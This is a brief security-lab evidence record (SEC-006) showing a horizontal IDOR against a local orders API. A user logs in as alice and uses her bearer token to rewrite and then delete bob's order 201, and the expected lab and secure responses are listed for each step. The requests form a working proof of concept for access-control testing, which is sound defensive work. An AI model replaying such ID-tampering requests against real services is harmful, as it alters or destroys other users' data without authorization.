### SEC-006 evidence — horizontal write IDOR on orders (lab mode)

# 1) Login as alice (owner of orders 101/102, NOT order 201)
POST http://127.0.0.1:8000/api/login
Content-Type: application/json

{"username":"alice","password":"password123"}

# 2) Mutate bob's order notes with alice's token
PATCH http://127.0.0.1:8000/api/orders/201
Authorization: Bearer lab-token-alice
Content-Type: application/json

{"notes":"hijacked by alice"}

# Lab: HTTP 200, notes replaced, owner_id remains 2
# Secure (LAB_MODE=false): HTTP 403 Forbidden

# 3) Unauthorized delete of bob's order
DELETE http://127.0.0.1:8000/api/orders/201
Authorization: Bearer lab-token-alice

# Lab: HTTP 200 {"detail":"deleted","id":201}
# Secure: HTTP 403; order 201 still readable by bob
